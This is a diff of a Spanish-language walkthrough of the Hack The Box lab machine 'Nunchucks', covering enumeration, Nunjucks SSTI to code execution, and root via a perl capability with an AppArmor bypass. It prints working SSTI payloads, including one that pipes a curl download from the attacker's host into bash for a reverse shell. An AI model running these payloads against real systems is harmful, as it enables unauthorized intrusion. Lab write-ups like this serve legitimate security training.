@@ -21,7 +21,9 @@ layout:
 
 ***
 
+## Reconnaissance
 
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Nunchucks**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.122 -oG allPorts
@@ -47,7 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds
            Raw packets sent: 65535 (2.884MB) | Rcvd: 65542 (2.622MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -60,7 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta unas páginas web de `Nginx` y el servicio de `SSH`.
 
 ```bash
 ❯ nmap -sCV -p22,80,443 10.10.11.122 -A -oN targeted -oX targetedXML
@@ -105,40 +107,42 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds
-
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (396).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep nunchucks
 10.10.11.122 nunchucks.htb 
 ```
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
 ```bash
 ❯ whatweb https://nunchucks.htb
 https://nunchucks.htb [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]
 ```
 
-
+Accederemos a [https://nunchuks.htb](https://nunchuks.htb) y nos encontramos con la siguiente página web, en la cual en una enumeración básica, no logramos obtener resultado relevante.
 
 <figure><img src="../../.gitbook/assets/imagen (397).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizamos una enumeración de directorios y páginas web que pudiera tener la página web, nos encontramos con el siguiente resultado.
 
 ```bash
 ❯ feroxbuster -u https://nunchucks.htb/ -t 200 -C 500,502,404 -k
@@ -172,15 +176,13 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 200      GET      125l      669w    53396c https://nunchucks.htb/assets/images/introduction.jpg
 ```
 
-
-
-
+Disponemos en [https://nunchucks.htb/](https://nunchucks.htb/)signup una página de registro de usuarios. Al intentar registrarnos como un nuevo usuarios, se nos indicaba que no podíamos realizar dicha acción.
 
 <figure><img src="../../.gitbook/assets/5035_vmware_bbTV7ousqb.png" alt=""><figcaption></figcaption></figure>
 
+### Subdomain Enumeration
 
-
-
+Realizamos una enumeración de subdominios, entre los cuales logramos encontrar un nuevo subdominio llamado `store.nunchucks.htb`.
 
 ```bash
 ❯ wfuzz --hh=30587 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.nunchucks.htb" https://nunchucks.htb 2>/dev/null
@@ -198,25 +200,25 @@ ID           Response   Lines    Word       Chars       Payload
 000000194:   200        101 L    259 W      4028 Ch     "store" 
 ```
 
-
+Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep nunchucks
 10.10.11.122 nunchucks.htb store.nunchucks.htbbas
 ```
 
-
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
 ```bash
 ❯ whatweb https://store.nunchucks.htb/
 https://store.nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery[1.10.2], Script[text/javascript], Title[Nunchucks Homepage], X-Powered-By[Express], X-UA-Compatible[IE=edge], nginx[1.18.0]
 ```
 
-
+Accedemos a [https://store.nunchucks.htb](https://store.nunchucks.htb) y nos encontramos con la siguiente página web.
 
 <figure><img src="../../.gitbook/assets/imagen (398).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizamos una enumeración de directorios y archivos a través de `feroxbuster` y no logramos obtener algún directorio o archivo interesante.
 
 ```bash
 ❯ feroxbuster -u https://store.nunchucks.htb/ -t 200 -C 500,502,404 -k
@@ -249,29 +251,41 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 200      GET     1566l     2676w    25180c https://store.nunchucks.htb/assets/css/font-awesome.css
 ```
 
+## Initial Access
 
+### Node.js SSTI (Server Side Template Injection)
+
+Realizando diversas pruebas en la página web, el único campo que nos parece interesante es en el cual nos permite indicar nuestro correo electrónico y posteriormente en el output por parte del servidor se imprime el input introducido.
+
+Con lo cual, nos abre la posibilidad de que quizás exista un `Template Engine` y podamos intentar realizar un `SSTI (Server Side Template Injection)`.
 
 <figure><img src="../../.gitbook/assets/imagen (399).png" alt=""><figcaption></figcaption></figure>
 
+Revisaremos nuevamente las tecnologías de la página web, y comprobamos que utiliza `Node.js` como lenguaje de programación.
 
+<figure><img src="../../.gitbook/assets/imagen (402).png" alt="" width="362"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (402).png" alt=""><figcaption></figcaption></figure>
-
-
+Intentamos realizar una inyección de `SSTI` básica, pero se nos indica que debemos introducir un correo válido.
 
 <figure><img src="../../.gitbook/assets/imagen (400).png" alt=""><figcaption></figcaption></figure>
 
-
+Por lo tanto, para intentar eludir esta restricción, interceptaremos la solicitud con `BurpSuite`. En la solicitud, verificamos que el `input`  y `output` se encuentran en un formato `JSON`
 
 <figure><img src="../../.gitbook/assets/imagen (401).png" alt=""><figcaption></figcaption></figure>
 
+Intentamos realizar la siguiente inyección básica de `SSTI` para comprobar si era vulnerable. En la respuesta por parte del servidor, comprobamos que se ha interpretado la operación y nos ha aparecido el resultado de `7*7`, con lo cual todo parece indicar que podemos realizar el `SSTI` correctamente.
 
+```json
+{{7*7}}
+```
 
 <figure><img src="../../.gitbook/assets/imagen (403).png" alt=""><figcaption></figcaption></figure>
 
-
+En el siguiente blog, se nos mencionan diversas técnicas  y payloads para identificar el tipo de `Template Engine` que nos enfrentamos.
 
 {% embed url="https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68" %}
+
+A través del siguiente `polyglot payload`, intentaremos enumerar el tipo de `Template Engine`. En este caso, solamente pudimos comprobar que se nos mostraba errores `JSON`, con lo cual nos hace afirmar que detrás quizás esté `Node.js` como se nos indicaba en el `Wappalyzer`.
 
 ```bash
 ${{<%[%'"}}%\.
@@ -279,23 +293,30 @@ ${{<%[%'"}}%\.
 
 <figure><img src="../../.gitbook/assets/imagen (405).png" alt=""><figcaption></figcaption></figure>
 
+En caso de vulnerabilidad, se puede devolver un mensaje de error o el servidor puede generar una excepción. Esto se puede utilizar para identificar la vulnerabilidad y el motor de plantillas en uso.
 
+* Para identificar la vulnerabilidad, se puede seguir la siguiente lista de tareas pendientes:
+* Detectar dónde existe la inyección de plantillas Identificar el motor de plantillas y validar la vulnerabilidad.
+* Seguir los manuales del motor de plantillas específico.
+* Aprovechar la vulnerabilidad
+
+Se puede utilizar la siguiente `Cheat Sheet` para identificar el motor de plantillas en uso:
 
 <figure><img src="../../.gitbook/assets/template-decision-tree.png" alt=""><figcaption></figcaption></figure>
 
+### Code Execution via SSTI (Node.js Nunjucks)
 
-
-
+Realizando una búsqueda sobre `Node.js SSTI`, nos encontramos con el siguiente blog en el cual mencionan la posibilidad de ejecutar comandos arbitrarios remotos a través de `SSTI Node.js Nunjucks`.
 
 <figure><img src="../../.gitbook/assets/imagen (404).png" alt=""><figcaption></figcaption></figure>
 
-
-
 {% embed url="https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/code-execution-via-ssti-nodejs-nunjucks/" %}
 
-
+Realizando una búsqueda por Internet, nos encontramos con el siguiente repositorio de GitHub el cual mediante `SSTI` en `Node.js Nunjucks`, logra obtener un `RCE`.
 
 {% embed url="https://github.com/NightRang3r/misc_nuclei_templates/blob/main/node-nunjucks-ssti.yaml" %}
+
+Inyectaremos el siguiente comando para que se nos muestre el contenido del`/etc/passwd`. Al enviar la solicitud a través de `BurpSuite`, en la respuesta del servidor se verifica el contenido del archivo del servidor. Con lo cual, queda confirmada la existencia de poder ejecutar comandos arbitrarios a través del `SSTI Node.js`.
 
 ```javascript
 {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}
@@ -303,7 +324,9 @@ ${{<%[%'"}}%\.
 
 <figure><img src="../../.gitbook/assets/5044_vmware_TSQyzmqJb7.png" alt=""><figcaption></figcaption></figure>
 
+Por lo tanto, podemos intentar realizar la Reverse Shell para conectarnos al equipo de diferentes maneras. En nuestro caso, para no tener problemas con las `'`, decidimos verificar si el binario de `cURL` se encontraba disponible en el sistema objetivo.
 
+A través de la siguiente inyección, se verificó que el binario `cURL` se encontraba instalado en el equipo.
 
 ```javascript
 {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('which curl')\")()}}
@@ -311,7 +334,7 @@ ${{<%[%'"}}%\.
 
 <figure><img src="../../.gitbook/assets/imagen (406).png" alt=""><figcaption></figcaption></figure>
 
-
+Por lo tanto, en nuestro equipo local crearemos un script sencillo en `Bash` para que se ejecute la Reverse Shell, este script lo compartiremos a través de un servidor web.
 
 ```bash
 ❯ cat shell.sh
@@ -323,16 +346,14 @@ ${{<%[%'"}}%\.
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde otra terminal, nos pondremos en escucha con `nc` para recibir la conexión.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
-
-
+Ejecutaremos la siguiente inyección `SSTI` para que realice un `cURL` hacía nuestro script de la Reverse Shell y lo ejecute a través de una `bash`.
 
 ```javascript
 {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl http://10.10.16.3/shell.sh|bash')\")()}}
@@ -340,7 +361,7 @@ listening on [any] 443 ...
 
 <figure><img src="../../.gitbook/assets/5046_vmware_fAYNzc0l0w.png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que finalmente logramos obtener el acceso correspondiente al sistema y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -349,10 +370,10 @@ connect to [10.10.16.3] from (UNKNOWN) [10.10.11.122] 37010
 bash: cannot set terminal process group (993): Inappropriate ioctl for device
 bash: no job control in this shell
 david@nunchucks:/var/www/store.nunchucks$ cat /home/david/user.txt
-d967f92377f2308aba4bbb3869c72b4a
+d967f92377f2*********************
 ```
 
-
+Al obtener la reverse shell, mejoramos la calidad de la shell con los siguientes pasos para obtener una TTY interactiva.
 
 ```bash
 david@nunchucks:/var/www/store.nunchucks$ script /dev/null -c bash
@@ -367,16 +388,20 @@ david@nunchucks:/var/www/store.nunchucks$ export SHELL=bash
 david@nunchucks:/var/www/store.nunchucks$ stty rows 46 columns 230
 ```
 
+## Privilege Escalation
 
+### Attempting to perform Abusing Capabilities (perl) \[FAILED]
 
-```
+Revisaremos una comprobación de los grupos y de si disponemos de permisos de `sudoers`. En este caso, no disponemos de grupos especiales y tampoco podemos comprobar los privilegios `sudoers` debido que nos requiere proporcionar credenciales del usuario `david` el cual de momento no disponemos.
+
+```bash
 david@nunchucks:/var/www/store.nunchucks$ id
 uid=1000(david) gid=1000(david) groups=1000(david)
 david@nunchucks:/var/www/store.nunchucks$ sudo -l
 [sudo] password for david: 
 ```
 
-
+Por otro lado, revisamos si había algún binario inusual con privilegios de `SUID`, no logramos encontrar ninguno. Intentamos también verificar si disponíamos de alguna `capabilitie`, en el resultado obtenido, nos encontramos la capabilitie `/usr/bin/perl = cap_setuid+ep`, con la cual podríamos llegar a aprovecharnos para obtener acceso como `root`.
 
 ```bash
 david@nunchucks:/var/www/store.nunchucks$ find / -perm -4000 2>/dev/null
@@ -406,7 +431,7 @@ david@nunchucks:/var/www/store.nunchucks$ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-
+A través dela herramienta de [searchbins](https://github.com/r1vs3c/searchbins), revisamos la manera de abusar de esta `capabilitie` que disponemos.
 
 ```bash
 ❯ searchbins -b perl -f capabilities
@@ -419,7 +444,9 @@ david@nunchucks:/var/www/store.nunchucks$ getcap -r / 2>/dev/null
 	| ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ```
 
+Revisamos la ubicación del binario `perl`, accedemos a su directorio y ejecutamos la sintaxis para poder abusar de esta `capabilitie`, en el primer comando intentamos obtener una `Bash` como `root` pero no obtuvimos resultado ninguno.
 
+Intentamos ejecutar el binario para obtener una _shell_ como _root_, pero no conseguimos una sesión completamente privilegiada. Al ejecutar `id`, vimos que el _UID_ era _root_, pero el _GID_ seguía siendo _david_, lo que impedía elevar nuestros privilegios.
 
 ```bash
 david@nunchucks:/var/www/store.nunchucks$ which perl
@@ -432,25 +459,23 @@ david@nunchucks:/usr/bin$ ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exe
 root
 ```
 
+### AppArmor Profile Bypass
 
-
-<figure><img src="../../.gitbook/assets/imagen (407).png" alt=""><figcaption></figcaption></figure>
-
-
-
-<figure><img src="../../.gitbook/assets/imagen (408).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
+Realizamos una enumeración con `linpeas.sh` y nos encontramos que `AppArmor` se encontraba habilitado en el sistema.
 
 {% hint style="info" %}
 AppArmor es un módulo de seguridad del kernel de Linux que puedes utilizar para restringir las capacidades de los procesos que se ejecutan en el sistema operativo host. Cada proceso puede tener su propio perfil de seguridad.
 {% endhint %}
 
+<figure><img src="../../.gitbook/assets/imagen (407).png" alt=""><figcaption></figcaption></figure>
+
+Por otro lado, también volvemos a verificar la existencia de la `capabilitie` mencionada.
+
+<figure><img src="../../.gitbook/assets/imagen (408).png" alt=""><figcaption></figcaption></figure>
+
+Al revisar la documentación sobre `AppArmor`, encontramos información sobre su funcionamiento y la ubicación donde se definen las políticas y restricciones de los binarios. Al analizar `/etc/apparmor.d/`, detectamos un perfil asociado a `/usr/bin/perl`, lo que podría limitar su uso en la explotación.
+
 {% embed url="https://computernewage.com/2022/09/03/gnu-linux-apparmor-tutorial/" %}
-
-
 
 ```bash
 david@nunchucks:/etc/apparmor.d$ ls -l
@@ -471,7 +496,14 @@ drwxr-xr-x 5 root root 4096 Oct 28  2021 tunables
 -rw-r--r-- 1 root root 1385 Dec  7  2019 usr.sbin.tcpdump
 ```
 
+Al revisar el perfil de `AppArmor` en `/etc/apparmor.d/usr.bin.perl`, observamos que `/usr/bin/perl` tiene la capacidad `setuid`, lo que le permite cambiar el _UID_ del proceso. Sin embargo, existen restricciones clave que limitan su alcance:
 
+* Se deniega el acceso de escritura y ejecución a `/root/*` y `/etc/shadow`.
+* No se permite la lectura de `/etc/nsswitch.conf`.
+* Se permite la ejecución controlada de algunos binarios como `/usr/bin/id`, `/usr/bin/ls`, `/usr/bin/cat` y `/usr/bin/whoami`.
+* Se restringe el acceso de `/usr/bin/perl` a ciertos archivos críticos, pero se permite la lectura en `/home/` y `/home/david/`.
+
+Estas reglas limitan el impacto de la _capability_ `setuid`, aunque aún es posible evaluar si existen formas de evasión para escalar privilegios.
 
 ```bash
 david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl
@@ -496,13 +528,14 @@ david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl
   /opt/backup.pl mrix,
   owner /home/ r,
   owner /home/david/ r,
-
 }
 ```
 
+Investigando en Internet, encontramos un blog donde explicaban cómo realizar un bypass de `AppArmor` usando un script en `Perl`. Siguiendo este método, creamos un script en `/tmp/gzzcoo.pl`, le asignamos permisos de ejecución y lo ejecutamos.
 
+Inicialmente, al ejecutar `perl gzzcoo.pl`, el sistema devolvió un error de _Permission denied_. Sin embargo, al ejecutarlo directamente (`./gzzcoo.pl`), logramos obtener una shell como `root` y acceder a la flag **root.txt**.
 
-
+Este comportamiento indica que `AppArmor` restringe la ejecución de `Perl` directamente, pero al ejecutar el script como binario, logramos evadir la restricción y escalar privilegios a `root`.
 
 {% embed url="https://0xma.github.io/hacking/bypass_apparmor_with_perl_script.html" %}
 
@@ -522,5 +555,5 @@ david@nunchucks:/tmp$ ./gzzcoo.pl
 root@nunchucks:/tmp# whoami
 root
 root@nunchucks:/tmp# cat /root/root.txt 
-d67dd7dd3350fdd2847d623f6e5e8333
+d67dd7dd335***********************
 ```
